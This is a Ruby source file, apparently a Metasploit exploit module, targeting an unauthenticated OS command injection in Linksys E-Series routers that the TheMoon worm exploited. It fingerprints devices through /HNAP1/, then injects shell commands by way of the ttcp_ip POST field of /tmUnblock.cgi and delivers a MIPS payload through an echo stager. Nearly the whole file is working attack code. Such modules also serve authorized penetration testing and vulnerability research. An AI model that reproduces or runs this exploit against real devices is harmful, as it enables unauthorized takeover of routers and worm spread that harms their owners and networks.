##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  
  VULNERABLE_DEVICES = %w{
    E300 E900 E1000 E1200 E1500 E1550 E2000 E2100L E2500 E3000 E3200 E4200
    WAG320N WAP300N WAP610N WES610N WET610N WRT150N WRT160N WRT320N WRT400N
    WRT600N WRT610N
  }

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerEcho

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Linksys E-Series TheMoon Remote Command Injection',
      'Description' => %q{
          Some Linksys E-Series Routers are vulnerable to an unauthenticated OS command
        injection. Since it is a blind os command injection vulnerability, there is no
        output for the executed command when using the cmd generic payload. A ping
        command against a controlled system could be used for testing purposes. This
        vulnerability was used from the so called "TheMoon" worm. There are many Systems
        that might be vulnerable: E4200, E3200, E3000, E2500, E2100L, E2000, E1550, E1500,
        E1200, E1000, E900. This module was tested against a E1500 v1.0.5.
      },
      'Author'      =>
        [
          'Johannes Ullrich', #worm discovery
          'Rew', # original exploit
          'infodox', # another exploit
          'Michael Messner <devnull@s3cur1ty.de>', # Metasploit module
          'juan vazquez', # minor help with msf module
          'joev' # echo stager
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'EDB', '31683' ],
          [ 'URL', 'http://packetstormsecurity.com/files/125252/Linksys-Worm-Remote-Root.html' ],
          [ 'URL', 'https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633' ]
        ],
      'DisclosureDate' => 'Feb 13 2014',
      'Privileged'     => true,
      'Platform'       => %w{ linux unix },
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        => [
        [ 'Linux mipsel Payload',
          {
            'Arch' => ARCH_MIPSLE,
            'Platform' => 'linux'
          }
        ],
        [ 'CMD',
          {
          'Arch' => ARCH_CMD,
          'Platform' => 'unix'
          }
        ]
      ],
      'DefaultTarget'  => 0
      ))
  end

  def check
    begin
      res = send_request_cgi('uri' => '/HNAP1/')
    rescue ::Rex::ConnectionError
      vprint_error("A connection error has occured")
      return Exploit::CheckCode::Unknown
    end

    if res and res.code == 200 and res.body =~ /<ModelName>(#{VULNERABLE_DEVICES.join('|')})<\/ModelName>/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def request(cmd, uri)
    begin
      res = send_request_cgi({
        'uri'    => uri,
        'method' => 'POST',
        'encode_params' => false,
        'vars_post' => {
          "submit_button" => "",
          "change_action" => "",
          "action" => "",
          "commit" => "0",
          "ttcp_num" => "2",
          "ttcp_size" => "2",
          "ttcp_ip" => "-h `#{cmd}`",
          "StartEPI" => "1"
        }
      })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{peer} - Failed to connect to the web server")
      return nil
    end
  end

  def exploit
    uri = '/tmUnblock.cgi'
    test_login!(uri)

    if target.name =~ /CMD/
      unless datastore['CMD'].present?
        fail_with(Failure::BadConfig, "#{peer} - Only the cmd/generic payload is compatible")
      end
      cmd = payload.encoded
      res = request(cmd, uri)
      unless res.present?
        fail_with(Failure::Unknown, "#{peer} - Unable to execute payload")
      else
        print_status("#{peer} - Blind Exploitation - unknown Exploitation state")
      end
      return
    else
      print_status("Starting stager..")
      execute_cmdstager
    end
  end

  def test_login!(uri)
    print_status("#{peer} - Trying to access the vulnerable url")
    begin
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET',
      })
      if res.nil? or res.code == 404
        fail_with(Failure::NoAccess, "#{peer} - No successful login possible")
      end
      if [200, 301, 302].include?(res.code)
        print_good("#{peer} - Successfully accessed #{uri}")
      else
        fail_with(Failure::NoAccess, "#{peer} - No successful login possible")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  # Callback from the echo cmd stager
  def execute_command(cmd, opts)
    uri = '/tmUnblock.cgi'
    request(cmd, uri)
  end

end
